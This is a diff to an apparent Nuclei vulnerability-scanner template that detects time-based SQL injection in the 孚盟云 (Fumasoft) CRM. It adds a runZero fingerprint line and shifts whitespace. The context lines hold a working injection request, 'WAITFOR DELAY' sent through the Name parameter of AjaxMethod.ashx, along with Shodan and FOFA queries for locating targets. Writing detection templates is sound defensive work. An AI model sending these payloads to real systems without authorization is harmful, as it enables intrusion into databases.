@@ -22,8 +22,8 @@ info:
     max-request: 1
     shodan-query: title:"孚盟云 "
     fofa-query: title="孚盟云 "
+    runzero-match: any(each(service["html.titles"]), {# matches "(?i)孚盟云 "})
   tags: time-based-sqli,fumasoft,sqli
-
 flow: http(1) && http(2)
 
 http:
@@ -43,13 +43,13 @@ http:
         @timeout: 30s
         GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27 HTTP/1.1
         Host: {{Hostname}}
-
       - |
         @timeout: 30s
         GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27;WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
         Host: {{Hostname}}
 
     stop-at-first-match: true
+
     matchers-condition: or
     matchers:
       - type: dsl
@@ -67,4 +67,3 @@ http:
           - 'regex("^0$", body_2)'
           - 'contains(content_type_2, "text/plain")'
         condition: and
-
